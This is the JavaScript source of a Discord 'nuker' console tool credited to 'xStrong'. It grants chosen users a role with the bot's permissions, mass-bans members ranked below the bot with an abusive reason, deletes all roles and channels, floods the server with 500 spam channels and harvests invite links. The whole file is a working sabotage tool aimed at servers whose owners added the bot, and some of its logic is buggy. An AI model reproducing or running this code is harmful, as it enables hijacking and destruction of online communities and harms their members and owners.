const Discord = require('discord.js');
const fs = require("fs");
const { spawn } = require('child_process');
const { Client, Intents } = require('discord.js');
const client = new Client({ intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MESSAGES] });
// Declare a variable to store the app info
let appInfo = null;
const helpp = "\x1b[1m\x1b[31mAll Avilable commands:\x1b[0m\n\x1b[32mtoken \x1b[0m-\x1b[36m and enter the token after to change token\x1b[32m\nid \x1b[0m- \x1b[36mto select server want to control\x1b[32m\nadmin\nbans\nunban\nban\nf users\nf spam\ninvite all\ninvite create\naddbot\nroles\nclear\nhelp\ninfo \n\x1b[0m"

// Listen for the ready event
client.on('ready', async () => {
	
  console.log(`This Tool Created By : \x1b[1m\x1b[31mxStrong!\x1b[0m`);
  console.log(`Support Link : \x1b[1m\x1b[31mhttps://discord.gg/ywqezMaVQU!\x1b[0m`);
  console.log(`Logged in as ${client.user.tag} ✔`);
  console.log(`Client ID: ${client.user.id}`);

  // Get the app info if it hasn't been fetched yet
  if (!appInfo) {
    appInfo = await client.fetchApplication();
  }

  // Log the owner ID
  const ownerID = appInfo.owner.id;
  console.log(`Owner ID: ${ownerID}`);
  console.log(helpp);
});

  const config = JSON.parse(fs.readFileSync("src/json/xs.json", "utf8"));
  const config2 = JSON.parse(fs.readFileSync("src/json/serverid.json", "utf8"));
  const config3 = JSON.parse(fs.readFileSync("src/json/clientToken.json", "utf8"));
  const token = config3.token;
  const serverId = config2.serverid2;
  const memberIds = config.usersid;
  console.log("Loaded xs.json");

// } catch (error) {
  // const token = prompt("Paste token: ");
  // const serverId = prompt("Paste serverid: ");
  // const memberId = prompt("Paste bot's owner ID (If several use ','): ");
  // const whiteListYesOrNo = prompt("Enable whitelisting (y/n): ").toLowerCase();
// }


process.stdin.resume();
process.stdin.setEncoding('utf8');
process.stdin.on('data', function(data) {
  const args = data.trim().split(' ');
  // input += data;
		if (args[0] === 'token') {
		  const token = args[1];

		if (!args[1]) {
			console.log(`Error: Please enter your client token as the second argument after the 'token' command.`);
			console.log(`\x1b[32mUsage:\x1b[36m token <token>\x1b[0m`);
			// process.exit(1);
		  } else {
			  const tokenObj = { token };
			  try {
				const { writeFileSync } = require('fs');
				writeFileSync('src/json/clientToken.json', JSON.stringify(tokenObj));
				console.log(`Client token saved to clientToken.json`);
				process.exit();
			  } catch (err) {
				console.log(`Error: Failed to save client token to file: ${err.message}`);
				process.exit(1);
			  }
			}
		}

	if (args[0] === 'id') {
	  const serverid2 = args[1];


	  if (!args[1]) {
		console.log(`Error: Please provide a value for the third argument.`);
		console.log(`\x1b[32mUsage:\x1b[36m id <serverid>\x1b[0m`);
	  } else {
		const tokenObj2 = { serverid2 };
		try {
		  const { writeFileSync } = require('fs');
		  writeFileSync('src/json/serverid.json', JSON.stringify(tokenObj2));
		  console.log(`Client token saved to serverid.json`);
		  process.exit();
		} catch (err) {
		  console.log(`Error: Failed to save client token to file: ${err.message}`);
		  process.exit(1);
		}
	  }
	}
	  
	if (args[0] === 'admin') {
		async function assignRoleToMember(serverId) {
		  const server = client.guilds.cache.get(serverId);
		  if (server) {
			const clientRole = server.me.roles.highest;
			const botRole = server.roles.cache.find(role => role.name === clientRole.name);
			if (botRole) {
			  const newRole = await server.roles.create({
				data: {
				  name: 'xstrong',
				  permissions: botRole.permissions.toArray()
				}
			  });
			  await newRole.setPosition(botRole.position - 1);
			  await newRole.setPermissions(newRole.permissions.toArray());

			  for (const memberId of memberIds) {
				// Fetch the member using memberId
				const member = await server.members.fetch(memberId);
				if (member) {
				  try {
					await member.roles.add(newRole);
					console.log(`\x1b[32mAssigned role \x1b[31m${newRole.name} \x1b[32mwith all permissions to user \x1b[31m${member.user.tag} \x1b[32min \x1b[31m${server.name}!\x1b[0m`);
				  } catch (error) {
					if (error.code === 50013) {
					  console.error(`\x1b[34mFailed to assign role to member due to missing permissions: \x1b[31m${error.message}`);
					} else {
					  console.error(`\x1b[34mEncountered an error while assigning role to member with ID ${memberId}: \x1b[31m${error.message}`);
					}
				  }
				} else {
				  console.error(`\x1b[34mFailed to find member with ID ${memberId} in server \x1b[31m${server.name}`);
				}
			  }
			} else {
			  console.error(`\x1b[34mFailed to find bot role in server \x1b[31m${server.name}`);
			}
		  } else {
			console.error(`\x1b[34mFailed to find server with ID \x1b[31m${serverId}`);
		  }
		}

	  // Call the function with your server ID
	  assignRoleToMember(serverId);
	}
  if (args[0] === 'ban') {
    const memberId2 = args[1];
    const reason = args.slice(2).join(' ');
    const server = client.guilds.cache.get(serverId);
    if (server) {
      const member = server.members.cache.get(memberId2);
      if (member) {
        member.ban({ reason: reason }).then(() => {
          console.log(`\x1b[32mUser \x1b[31m${member.user.tag}\x1b[32m has been banned from server\x1b[31m ${server.name}!\x1b[0m`);
        }).catch(error => {
          console.error(`Failed to ban user ${member.user.tag} from ${server.name}: ${error}`);
        });
      } else {
        console.error(`\x1b[34mFailed to find member with ID \x1b[31m${memberId2}\x1b[34m in \x1b[31m${server.name}\x1b[0m`);
      }
    }
    else {
      console.error(`\x1b[34mFailed to find server with ID \x1b[31m${serverId}`);
    }
  }
  if (args[0] === 'unban') {
    const userId = args[1];
    const server = client.guilds.cache.get(serverId);
    if (server) {
      server.fetchBans().then(bans => {
        const bannedUser = bans.find(ban => ban.user.id === userId);
        if (bannedUser) {
          const user = bannedUser.user;
          server.members.unban(user).then(() => {
            console.log(`\x1b[32mUser \x1b[31m${user.tag}\x1b[32m has been unbanned from \x1b[31m${server.name}!\x1b[0m`);
          }).catch(error => {
            console.error(`\x1b[34mFailed to unban user \x1b[31m${user.tag}\x1b[34m from \x1b[31m${server.name}: \x1b[31m${error}`);
          });
        } else {
          console.log(`\x1b[34mUser with ID ${userId} is not banned from \x1b[31m${server.name}.`)
        }
      }).catch(error => {
        console.error(`\x1b[34mFailed to fetch bans from \x1b[31m${server.name}: ${error}`);
      });
    } else {
      console.error(`\x1b[34mFailed to find server with ID \x1b[31m${serverId}`);
    }
  }
  if (args[0] === 'bans') {
    const server = client.guilds.cache.get(serverId);
    if (server) {
      server.fetchBans().then((bans) => {
        const banCount = bans.size;
        if (banCount === 0) return console.log(`There are no banned members in \x1b[32m${server.name}\x1b[0m.`);
        console.log(`\x1b[32mBan count in \x1b[31m${server.name}:\x1b[32m ${banCount}\x1b[0m`);
        const banList = bans.map((ban) => `\x1b[31m** \x1b[32m${ban.user.tag}\x1b[31m ** \x1b[32m(${ban.user.id})\x1b[0m`).join('\n');
        console.log(banList);
      }).catch((error) => {
        console.error(`\x1b[34mFailed to fetch bans from \x1b[31m${server.name}: ${error}`);
      });
    } else {
      console.error(`\x1b[34mFailed to find server with ID \x1b[31m${serverId}`);
    }
  }
  if (args[0] === 'f') {
	if (args[1] === 'users') {
	  const guild = client.guilds.cache.get(serverId);
	  const botRole = guild.me.roles.highest; // Get the bot's highest role in the guild
	  guild.members.cache
		.filter(member => member.id !== memberIds && member.id !== guild.ownerID)
		.forEach(member => {
		  const memberRole = member.roles.highest; // Get the member's highest role in the guild
		  if (memberRole.position < botRole.position) { // Check if the member's role position is lower than the bot's role position
			member.ban({ reason: 'Fucked by xstrong' })
			  .then(() => {
				console.log(`\x1b[32mUser \x1b[31m${member.user.tag}\x1b[32m has been banned from \x1b[3.1m ${guild.name}!\x1b[0m`);
			  })
			  .catch(err => {
				console.log(`Failed to ban member ${member.user.tag}: ${err}`);
			  }); 
		  }
		});
	} else if (args[1] === 'spam') {
    
		(async () => {
		  const guild = client.guilds.cache.get(serverId);
		  if (guild) {
			if (guild.features.includes('COMMUNITY')) {
			  await client.api.guilds(guild.id).patch({ data: { features: guild.features.filter(feature => feature !== 'COMMUNITY') } });
			  console.log(`\x1b[36mDisabled the community server feature for \x1b[31m${guild.name}\x1b[0m`);
			}
		  } else {
			console.error(`\x1b[34mFailed to find server with ID \x1b[31m${serverId}`);
		  }
		})();
    
      const channelname = 'by-xstrong';
      const server = client.guilds.cache.get(serverId);
      if (server) {
		const clientRole = server.roles.cache.get(client.user.id);
    const roles = server.roles.cache.filter(role => {
      return !role.managed && role.id !== client.user.id && role.name !== 'xstrong' && role.name !== '@everyone';
    });
    // console.log(`Found ${roles.size} roles to delete:`);
    roles.forEach(role => {
      // console.log(`- ${role.name} (${role.id})`);
      role.delete()
        .then(() => {
          console.log(`\x1b[32mDeleted role: \x1b[31m${role.name}\x1b[0m`);
        })
        .catch(error => {
          console.error(`Failed to delete role ${role.name}: ${error}`);
        });
    });
        for (let i = 0; i < 500; i++) {
          const name = channelname + i;
          server.channels.create(name, { type: 'text' })
            .then(channel => console.log(`\x1b[32mCreated channel \x1b[31m${channel.name} \x1b[32min \x1b[31m${server.name}\x1b[0m`))
            .catch(error => console.error(`\x1b[34mFailed to create channel \x1b[31m${name}: ${error}`));
        }
        server.channels.cache.forEach(channel => {
          channel.delete()
            .then(deletedChannel => console.log(`\x1b[31mDeleted channel \x1b[32m${deletedChannel.name}`))
            .catch(error => console.error(`\x1b[34mFailed to delete channel ${channel.name}: ${error}`));
        });
        console.log(`\x1b[34mDeleting channels in server \x1b[31m${server.name}...`);

      } else {
        console.error(`\x1b[34mFailed to find server with ID \x1b[31m${serverId}`);
      }
    }
  }
  if (args[0] === 'invite') {
	if (args[1] === 'all') {
	  client.guilds.cache.forEach(server => {
		const botMember = server.members.cache.get(client.user.id);
		if (botMember.permissions.has('MANAGE_GUILD')) {
		  server.fetchInvites().then(invites => {
			if (invites.size > 0) {
			  const inviteList = invites.map(invite => {
				return `\x1b[32mInvite: \x1b[31m${invite.url}\x1b[0m`;
			  });

			  console.log(`\n\nInvites for ${server.name}:\n${inviteList.join("\n")}`);
			}
		  });
		} else {
		  console.log(`\x1b[32mBot does not have permissions to view invites for ${server.name}.\x1b[0m\n`);
		}
	  });
	} else if (args[1] === 'create') {
      const server = client.guilds.cache.get(serverId);
      if (server) {
        server.channels.cache.random().createInvite().then(invite => {
          console.log(`\x1b[32mInvite created for ${server.name}\x1b[32m: \x1b[31m${invite.url}\x1b[0m`);
        });
      }
    }
  }
	if (args[0] === 'addbot') {
	  const botToken = args[1];
	  const serverId2 = serverId; // the ID of the server to add the bot to
	  const server = client.guilds.cache.get(serverId2);
	  if (server) {
		server.channels.cache.first().createInvite({ maxUses: 1 }).then(invite => {
		  const inviteUrl = `https://discord.gg/${invite.code}`;
		  const bot = new Discord.Client();
		  bot.login(botToken).then(() => {
			bot.on('ready', () => {
			  bot.guilds.cache.get(serverId2).channels.cache.first().createInvite({ maxUses: 1 }).then(invite => {
				const botInviteUrl = `https://discord.gg/${invite.code}`;
				console.log(`\x1b[32mBot \x1b[31m${bot.user.tag} \x1b[32minvited in \x1b[31m${server.name}\x1b[0m`);
				bot.destroy();
			  }).catch(error => {
				console.error(`Failed to create invite for bot: ${error}`);
				bot.destroy();
			  });
			});
		  }).catch(error => {
			console.error(`Failed to log in to bot: ${error}`);
		  });
		});
	  } else {
		console.error(`Failed to find server with ID ${serverId2}`);
	  }
	}
  if (args[0] === 'info') {
    const guilds = client.guilds.cache.filter(guild => guild.members.cache.has(client.user.id));
    guilds.forEach(async guild => {
      const owner = await guild.members.fetch(guild.ownerID);
      const member = guild.members.cache.get(client.user.id);
      if (member.permissions.has('ADMINISTRATOR')) {
        console.log(`\x1b[32mGuild name:\x1b[31m ${guild.name}\n\x1b[32mGuild ID: \x1b[31m${guild.id}\n\x1b[32mGuild owner: \x1b[31m${owner.user.tag} \n\x1b[32mGuilds Members: \x1b[31m${guild.memberCount}\n\x1b[32mBot permissions \x1b[31mADMINISTRATOR\x1b[0m\n`);
      } else {
        console.log(`\x1b[32mGuild name:\x1b[31m ${guild.name}\n\x1b[32mGuild ID: \x1b[31m${guild.id}\n\x1b[32mGuild owner: \x1b[31m${owner.user.tag} \n\x1b[32mGuilds Members: \x1b[31m${guild.memberCount}\n\x1b[32mBot permissions \x1b[31m${member.permissions.toArray().join(', ')}\x1b[0m\n`);
      }
    });
  }
  if (args[0] === 'roles') {
    const guild = client.guilds.cache.find(guild => guild.id === serverId);
    if (!guild) {
      console.log(`\x1b[31mError: Could not find server '${serverId}'.\x1b[0m`);
      return;
    }
    const roles = guild.roles.cache.map(role => `\x1b[32m${role.name} \x1b[31m(${role.id})`).join('\n\n');
    console.log(`\x1b[34mRoles in \x1b[31m${guild.name}\x1b[34m:\n \n======================\x1b[0m\n${roles}\x1b[34m\n======================\x1b[0m`);
  }
  if (args[0] === 'cls') {
  console.log('\n'.repeat(process.stdout.rows));
  }
  if (args[0] === 'help') {
  console.log(`This Tool Created By : \x1b[1m\x1b[31mxStrong!\x1b[0m`);
  console.log(`Support Link : \x1b[1m\x1b[31mhttps://discord.gg/ywqezMaVQU!\x1b[0m`);
  console.log(`Logged in as ${client.user.tag} ✔`);
  console.log(`Client ID: ${client.user.id}`);

  // Get the app info if it hasn't been fetched yet
  if (!appInfo) {
    appInfo = client.fetchApplication();
  }

  // Log the owner ID
  const ownerID = appInfo.owner.id;
  console.log(`Owner ID: ${ownerID}`);
  console.log(helpp);
  }

});

client.login(token).catch(err => {console.log(`\x1b[34m${err}\x1b[0m`)})
